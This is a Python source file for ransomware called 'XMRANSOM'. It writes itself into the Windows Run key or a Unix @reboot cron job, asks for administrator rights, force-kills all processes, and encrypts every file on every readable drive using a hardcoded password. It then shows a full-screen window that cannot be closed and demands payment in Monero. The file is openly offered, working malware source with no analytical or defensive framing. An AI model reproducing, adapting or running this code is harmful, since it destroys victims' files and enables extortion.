import os
import platform
import subprocess  # Untuk mendukung Unix-like OS
import ctypes  # Untuk Windows
from tkinter import *
from screeninfo import get_monitors
import psutil
import sys
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class RansomWindow(Frame):
    def __init__(self, master: Tk):
        super().__init__(master)
        self.pack()
        
        monitor = get_monitors()[0]
        screen_width = monitor.width
        screen_height = monitor.height

        size_x = round(screen_width * 0.95)
        size_y = round(screen_height * 0.95)
        offset_x = (screen_width - size_x) // 2
        offset_y = (screen_height - size_y) // 2

        master.geometry(f"{size_x}x{size_y}+{offset_x}+{offset_y}")
        master.overrideredirect(True)
        master.config(bg="#1E1E1E")

        title_label = Label(master, text="XMRANSOM", font=("Arial", 25, "bold"), bg="#1E1E1E", fg="white")
        title_label.pack(pady=10)

        paragraph_label = Label(master, text=get_labels().get("paragraph_label"), font=("Arial", 16), justify="center", bg="#1E1E1E", fg="white", wraplength=size_x)
        paragraph_label.pack(pady=80)

        xmr_tutorial_button = Button(master, text="how?", command=lambda: open_tutorial_window(), width=40, height=3, font=("Arial", 12, "bold"), fg="#1E1E1E")
        xmr_tutorial_button.pack()

        payout_label = Label(master, text=get_labels().get("XMR_Address"), font=("Arial", 12, "bold"), justify="center", wraplength=750, bg="#1E1E1E", fg="white")
        payout_label.pack(side="bottom")

        master.protocol("WM_DELETE_WINDOW", lambda: on_try_exit_ransomware(master))

def get_labels():
    with open("labels.txt", 'r', encoding='utf-8') as file:
        ascii_art = {}
        current_label = None
        current_art = []

        for line in file:
            line = line.rstrip('\r\n')
            if line.startswith('---') and line.endswith('---'):
                if current_label and current_art:
                    ascii_art[current_label] = '\n'.join(current_art)
                    current_art = []
                current_label = line.replace('---', '').strip()
            else:
                current_art.append(line)

        if current_label and current_art:
            ascii_art[current_label] = '\n'.join(current_art)

    return ascii_art

def open_tutorial_window():
    tutorial_window = Tk()

    monitor = get_monitors()[0]
    screen_width = monitor.width
    screen_height = monitor.height

    size_x = round(screen_width * 0.60)
    size_y = round(screen_height * 0.60)
    offset_x = (screen_width - size_x) // 2
    offset_y = (screen_height - size_y) // 2

    tutorial_window.geometry(f"{size_x}x{size_y}+{offset_x}+{offset_y}")
    tutorial_window.title("XMR Tutorial")

    tutorial_label = Label(tutorial_window, text=get_labels().get("XMR_tutorial"), font=("Arial", 12, "bold"), wraplength=size_x)
    tutorial_label.pack()

    tutorial_window.mainloop()

def on_try_exit_ransomware(master: Tk):
    master.destroy()

    new_root = Tk()
    new_ransomWindow = RansomWindow(new_root)
    new_root.mainloop()

def add_to_startup_and_admin():
    if platform.system() == "Windows":
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = os.path.basename(sys.argv[0])
        app_path = os.path.abspath(sys.argv[0])

        try:
            import winreg as reg
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
            reg.CloseKey(reg_key)

            if not ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except Exception as e:
            print(f"Windows startup/admin error: {e}")
    else:
        script_path = os.path.abspath(sys.argv[0])
        cron_command = f'@reboot /usr/bin/python3 {script_path}\n'
        try:
            with open('/tmp/cron_job', 'w') as cron_file:
                cron_file.write(cron_command)
            subprocess.run(['crontab', '/tmp/cron_job'], check=True)
            os.remove('/tmp/cron_job')
        except Exception as e:
            print(f"Unix startup error: {e}")

def close_all_tasks():
    if platform.system() == "Windows":
        os.system("taskkill -t -f -im *")
    else:
        os.system("pkill -9 -e *")

def encrypt_file(file_path, password):
    salt = os.urandom(16)
    key = PBKDF2HMAC(hashes.SHA256(), 32, salt, 100000, backend=default_backend()).derive(password)
    iv = os.urandom(16)

    with open(file_path, "rb") as file:
        plaintext = file.read()

    padder = padding.PKCS7(128).padder()
    padded_plaintext = padder.update(plaintext) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend()).encryptor()
    ciphertext = cipher.update(padded_plaintext) + cipher.finalize()

    with open(file_path, "wb") as encrypted_file:
        encrypted_file.write(salt + iv + ciphertext)

def encrypt_all_files(password):
    for drive in get_all_drives():
        for root, _, files in os.walk(drive):
            for file in files:
                try:
                    encrypt_file(os.path.join(root, file), password)
                except Exception:
                    pass

def get_all_drives():
    return [drive.device for drive in psutil.disk_partitions() if os.access(drive.device, os.R_OK)]

def main():
    add_to_startup_and_admin()
    close_all_tasks()
    encrypt_all_files(b"x0118ichimoci")

if __name__ == "__main__":
    main()

root = Tk()
ransomWindow = RansomWindow(root)
root.mainloop()
